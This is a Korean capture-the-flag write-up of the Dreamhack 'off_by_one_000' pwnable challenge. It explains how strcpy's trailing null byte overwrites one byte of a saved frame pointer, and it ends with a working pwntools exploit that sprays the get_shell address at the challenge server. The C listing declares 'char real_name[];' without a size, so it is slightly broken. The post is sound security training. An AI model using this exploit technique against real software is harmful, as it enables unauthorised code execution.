---
layout: post
title: Dreamhack | Off By One_000
subtitle: Dreamhack-Pwnable off_by_one_000
categories: Pwnable
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/203474983-23dde79e-d280-47c5-b652-e55fc4974053.jpg" width = 550>
</p>

**Off-by-one 취약점**은 경계 검사에서 하나의 오차가 있을 때 발생하는 취약점입니다. 이는 버퍼의 경계 계산 혹은 반복문의 횟수 계산 시 `<` 대신 `<=`을 쓰거나, 0부터 시작하는 인덱스를 고려하지 못할 때 발생합니다.

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int cpy()
{
    char real_name[];
    strcpy(real_name, cp_name);
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}

`get_shell()` 함수가 포함되어 있기에 RET를 이 함수로 덮으면 될 것으로 예상이 된다.

```C
read(0, cp_name, sizeof(cp_name));
```

```
0x08048685 <+21>:    push   0x100
0x0804868a <+26>:    push   0x804a060
0x0804868f <+31>:    push   0x0
0x08048691 <+33>:    call   0x8048430 <read@plt>
```

`cp_name`는 256byte로 해당 전역변수에 입력 값을 할당하고 있다.

`cpy`함수를 보면 아래처럼 나오게 된다.

```armasm
0x0804864c <+0>:     push   ebp
0x0804864d <+1>:     mov    ebp,esp
0x0804864f <+3>:     sub    esp,0x100
0x08048655 <+9>:     push   0x804a060 // <-- cpname
0x0804865a <+14>:    lea    eax,[ebp-0x100]
0x08048660 <+20>:    push   eax
0x08048661 <+21>:    call   0x8048470 <strcpy@plt>
0x08048666 <+26>:    add    esp,0x8
0x08048669 <+29>:    mov    eax,0x0
0x0804866e <+34>:    leave
0x0804866f <+35>:    ret
```

정해진 256byte를 입력받기에 RET까지의 Over write는 불가능할 것으로 보인다. 하지만, `read()`함수는 마지막에 **\n**를 포함시켜서 저장하고, cpy()의 `strcpy()`는 `\n`직전까지의 값을 복사하는 것이 아닌  끝나는 **NULL 문자(\x00)**를 포함하여 string2를 string1에서 지정한 위치로 복사하여 모든 값을 넣기에 256byte의 값이 아닌 257byte의 값을 버퍼에 넣게 된다.

취약해보이는 cpy의 버퍼를 보게 되면 ebp와 esp는 256byte 차이이고, 만약 1byte가 넘어가게 되면 SFP의 1byte를 overwrite하게 된다.

* **cpy** 메모리

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208592228-851f59c5-82fd-4833-b738-6d1d244332eb.png" width = 420>
</p>

**RED** 박스는 `cpy`의 SFP가 되고, **YELLOW** 박스는 `cpy`의 RET가 된다.

* cpy return 이후 **main** 메모리

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208594072-0e319389-bebb-4fd7-9dbe-244fdc5c9142.png" width = 420>
</p>

`eip`의 값을 보면 cpy 메모리에서 노란색 RET의 값이고, 이것은 cpy 메모리에서 빨간색 SFP가 가리키던 값이 된다.

**cpy SFP 메모리 주소 = cpy RET 메모리 값 = return 이후 main의 eip**

main RET, cpy RET의 값을 BOF로 변경할 수 없으므로, strcpy의 **off by one** 취약점을 이용해 cpy SFP를 변경하면 된다.

`strcpy`시 마지막 널 바이트가 포함되므로 cpy SFP는 **0xff9a0b88**가 아닌 **0xff9a0b00**이 된다.

이 값은 strcpy에 포함되는 범위이기에 get_shell를 256byte만큼 도배하면 된다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 20769)
e = ELF('./off_by_one_000')

get_shell = e.symbols['get_shell']
payload = b''

for i in range(64):
    payload += p32(get_shell)
p.send(payload)
p.interactive()
```